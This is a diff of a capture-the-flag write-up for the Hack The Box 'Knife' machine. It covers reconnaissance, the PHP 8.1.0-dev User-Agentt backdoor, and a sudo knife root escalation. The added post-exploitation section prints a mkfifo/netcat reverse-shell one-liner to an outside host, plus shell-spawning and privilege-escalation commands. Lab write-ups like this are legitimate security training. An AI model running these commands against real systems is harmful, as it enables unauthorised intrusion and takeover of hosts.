@@ -1,3 +1,4 @@
+<b>
 # Description
 Knife is an easy linux box
 
@@ -26,7 +27,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-I also run whatweb to gather further information for the website
+I also ran whatweb to gather further information for the website
 `whatweb -a 3 10.10.10.242`
 ```
 http://10.10.10.242 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
@@ -65,4 +66,34 @@ The server runs `Apache 2.4.41` and uses `PHP 8.1.0-dev`
 Looking up `php 8.1.0 exploit` leads to this:
 https://www.exploit-db.com/exploits/49933
 
-The cause of the exploit was an early realease which contained a backdoor, the backdoor was removed but any server that still runs this version, an attacker can execute arbitrary code by sending the `User-Agentt` header
+The cause of the exploit was an early realease which contained a backdoor
+The backdoor was removed but any server that still runs this version, an attacker can execute arbitrary code by sending the `User-Agentt` header
+# Exploitation
+Running the exploit, it asks for full URL: `http://10.10.10.242/`
+It spawned pseudo shell
+# Post-Exploitation
+The job control is turned off so i couldnt spawn interactive shell no matter what i tried:
+`/bin/sh -i`
+`python3 -c 'import pty; pty.spawn("/bin/sh")'`
+`perl —e 'exec "/bin/sh";'`
+
+In that case, i opened netcat listner on port 4444 and executed reverse shell on the pseudo shell
+`nc -lvnp 4444` (listener)
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)
+
+Having reverse shell from `nc`, i upgraded to interactive shell
+`python3 -c 'import pty; pty.spawn("/bin/sh")'`
+
+Browsing through directories, in the home directory there is only one called `james`, the flag can be found inside `/home/james/user.txt`
+After that i started checking common things like the `sudo --version`, the `uname -a` but exploits didn't work
+Checking `sudo -l` to see what i can run as sudo led to this
+```
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+```
+Looking up `usr/bin/knife exploit` gave me this
+https://gtfobins.github.io/gtfobins/knife/
+
+Running the `sudo knife exec -E 'exec "/bin/sh"'` allowed becoming root
+The flag was located at `/root/root.txt`
+</b>
